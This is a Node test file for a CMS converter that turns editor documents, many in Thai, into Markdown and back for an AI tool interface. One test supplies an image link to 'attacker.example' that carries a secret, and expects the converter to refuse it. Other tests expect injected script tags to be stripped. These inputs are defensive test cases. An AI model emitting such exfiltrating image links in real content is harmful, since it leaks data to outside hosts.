import assert from 'node:assert/strict';
import test from 'node:test';

import { documentToMarkdown } from '../../src/server/mcp/markdown-out';
import { markdownToDocument, McpInputError } from '../../src/server/mcp/markdown-in';
import type { EditorDocument } from '../../src/types/cms';

const MEDIA = '55555555-5555-4555-8555-555555555555';
const p = (text: string, marks?: { type: string; attrs?: Record<string, unknown> }[], attrs?: Record<string, unknown>) =>
  ({ type: 'paragraph', ...(attrs ? { attrs } : {}), content: [{ type: 'text', text, ...(marks ? { marks } : {}) }] });
const video = { type: 'video', attrs: { provider: 'youtube', videoId: 'dQw4w9WgXcQ', start: null, title: 'คลิป', mediaId: null } };
const source = {
  type: 'doc',
  content: [
    { type: 'heading', attrs: { level: 2 }, content: [{ type: 'text', text: 'หัวข้อ' }] },
    p('สีแดง', [{ type: 'textColor', attrs: { color: 'red' } }], { textAlign: 'center' }),
    p('ขีดเส้นใต้', [{ type: 'underline' }]),
    video,
    { type: 'image', attrs: { src: `/media/${MEDIA}`, alt: 'รูป', mediaId: MEDIA } },
  ],
} as EditorDocument;

test('reading turns a draft into Markdown, says what it could not show, and stands blocks in as lines', () => {
  const out = documentToMarkdown(source);
  assert.match(out.markdown, /^## หัวข้อ/m);
  assert.match(out.markdown, /^สีแดง$/m);
  assert.doesNotMatch(out.markdown, /\+\+/, 'underline is not written as ++');
  assert.match(out.markdown, /^\{\{tome:block 1\}\}$/m);
  assert.match(out.markdown, new RegExp(`!\\[รูป\\]\\(/media/${MEDIA}\\)`));
  assert.deepEqual(out.blocks, [{ n: 1, kind: 'video', label: 'คลิป' }]);
  assert.deepEqual(out.formattingNotShown, { color: 1, underline: 1, align: 1 });
});

test('writing puts each block line back as the block it stood for', async () => {
  const { markdown } = documentToMarkdown(source);
  const { document } = await markdownToDocument(markdown.replace('หัวข้อ', 'หัวข้อใหม่'), source);
  assert.deepEqual(document.content?.find((node) => node.type === 'video'), video);
  assert.equal(document.content?.[0]?.content?.[0]?.text, 'หัวข้อใหม่');
});

test('an unknown block, a block line in a new draft, and a picture from elsewhere are refused with what to do', async () => {
  await assert.rejects(markdownToDocument('{{tome:block 7}}', source), (error) => error instanceof McpInputError && /block 7/.test(error.message));
  await assert.rejects(markdownToDocument('{{tome:block 1}}', null), (error) => error instanceof McpInputError && /new draft/.test(error.message));
  await assert.rejects(
    markdownToDocument('![x](https://attacker.example/?d=secret)', null),
    (error) => error instanceof McpInputError && /list_media/.test(error.message) && /attacker\.example/.test(error.message),
  );
  await assert.rejects(markdownToDocument('![x](/media/not-a-uuid)', null), McpInputError);
});

test('HTML is removed and said, and a library picture is kept', async () => {
  const { document, warnings } = await markdownToDocument(`ก่อน\n\n<script>x</script>\n\n![a](/media/${MEDIA})`, null);
  assert.deepEqual(document.content?.map((node) => node.type), ['paragraph', 'image']);
  assert.equal(document.content?.[1]?.attrs?.src, `/media/${MEDIA}`);
  assert.ok(warnings.some((warning) => /HTML/.test(warning)));
});

test('a body that starts with a rule keeps its first lines and the rule', async () => {
  const { document } = await markdownToDocument('---\n\ntext', null);
  assert.deepEqual(document.content?.map((node) => node.type), ['horizontalRule', 'paragraph']);
  assert.equal(document.content?.[1]?.content?.[0]?.text, 'text');
});

test('a first heading of level one stays in the body', async () => {
  const { document } = await markdownToDocument('# ใหญ่\n\ntext', null);
  assert.deepEqual(document.content?.map((node) => node.type), ['heading', 'paragraph']);
});

test('a block line inside a list is refused, since the editor cannot hold a block there', async () => {
  await assert.rejects(
    markdownToDocument('- {{tome:block 1}}', source),
    (error) => error instanceof McpInputError && error.message === 'Keep each {{tome:block N}} line on a line of its own, outside lists and quotes, and try again.',
  );
});

test('a block line in a quote, and one on its own, give documents the editor can hold', async () => {
  const quoted = await markdownToDocument('> {{tome:block 1}}', source);
  assert.deepEqual(quoted.document.content?.[0]?.content?.[0], video);
  const alone = await markdownToDocument('text\n\n{{tome:block 1}}', source);
  assert.deepEqual(alone.document.content?.map((node) => node.type), ['paragraph', 'video']);
});

// The shape of a real post: a numbered item whose words are followed by a picture and more words.
const listed = {
  type: 'doc',
  content: [{
    type: 'orderedList', attrs: { start: 1 }, content: [
      { type: 'listItem', content: [p('หัวข้อย่อย', [{ type: 'bold' }]), { type: 'image', attrs: { src: `/media/${MEDIA}`, alt: 'รูป', mediaId: MEDIA } }, p('ข้อความต่อจากรูป')] },
      { type: 'listItem', content: [p('ข้อถัดไป')] },
    ],
  }],
} as EditorDocument;

test('a picture inside a list item comes back where it was when its draft is read and written again', async () => {
  const { markdown } = documentToMarkdown(listed);
  const { document } = await markdownToDocument(markdown, listed);
  const item = document.content?.[0]?.content?.[0];
  assert.deepEqual(item?.content?.map((node) => node.type), ['paragraph', 'image', 'paragraph']);
  assert.equal(item?.content?.[1]?.attrs?.src, `/media/${MEDIA}`);
  assert.equal(item?.content?.[0]?.content?.[0]?.text, 'หัวข้อย่อย', 'no line end is left behind the words');
  assert.equal(item?.content?.[2]?.content?.[0]?.text, 'ข้อความต่อจากรูป');
});

test('a picture an AI writes inside a line of words stands on its own between them', async () => {
  const { document } = await markdownToDocument(`ก่อนรูป ![a](/media/${MEDIA}) หลังรูป`, null);
  assert.deepEqual(document.content?.map((node) => node.type), ['paragraph', 'image', 'paragraph']);
  assert.deepEqual(document.content?.map((node) => node.content?.[0]?.text ?? null), ['ก่อนรูป', null, 'หลังรูป']);
});

// /\s+$/ took seconds per 100,000 spaces here, on the main thread, outside the worker's time limit.
test('a long run of spaces before a picture is trimmed without stalling the server', async () => {
  const started = Date.now();
  const { document } = await markdownToDocument(`x${'\t'.repeat(200_000)}y![a](/media/${MEDIA})`, null);
  assert.ok(Date.now() - started < 5_000, `took ${Date.now() - started} ms`);
  assert.deepEqual(document.content?.map((node) => node.type), ['paragraph', 'image']);
});

const GROUPS = ['a0000000-0000-4000-8000-000000000001', 'a0000000-0000-4000-8000-000000000002', 'a0000000-0000-4000-8000-000000000003'];
const picked = { type: 'postList', attrs: { source: 'posts', postGroupIds: GROUPS, categoryId: null, limit: 6, layout: 'grid-3' } };
const byCategory = { type: 'postList', attrs: { source: 'category', postGroupIds: [], categoryId: 'b0000000-0000-4000-8000-000000000001', limit: 3, layout: 'list' } };

test('a post list stands in as a numbered block with a label', () => {
  const out = documentToMarkdown({ type: 'doc', content: [picked, p('ระหว่าง'), byCategory] } as EditorDocument);
  assert.match(out.markdown, /^\{\{tome:block 1\}\}\n\nระหว่าง\n\n\{\{tome:block 2\}\}$/);
  assert.deepEqual(out.blocks, [
    { n: 1, kind: 'postList', label: 'Post list (3 posts)' },
    { n: 2, kind: 'postList', label: 'Post list (category)' },
  ]);
  const one = { ...picked, attrs: { ...picked.attrs, postGroupIds: [GROUPS[0]] } };
  assert.equal(documentToMarkdown({ type: 'doc', content: [one] } as EditorDocument).blocks[0]?.label, 'Post list (1 post)');
});

test('moving a block in Markdown keeps its attrs whole', async () => {
  const held = { type: 'doc', content: [picked, p('กลาง'), byCategory] } as EditorDocument;
  const { document } = await markdownToDocument('{{tome:block 2}}\n\nกลาง\n\n{{tome:block 1}}', held);
  assert.deepEqual(document.content?.map((node) => node.type), ['postList', 'paragraph', 'postList']);
  assert.deepEqual(document.content?.[0]?.attrs, byCategory.attrs);
  assert.deepEqual(document.content?.[2]?.attrs, picked.attrs);
});

test('a new draft cannot hold a post list', async () => {
  await assert.rejects(markdownToDocument('{{tome:block 1}}', null), (error) => error instanceof McpInputError && /new draft/.test(error.message));
});
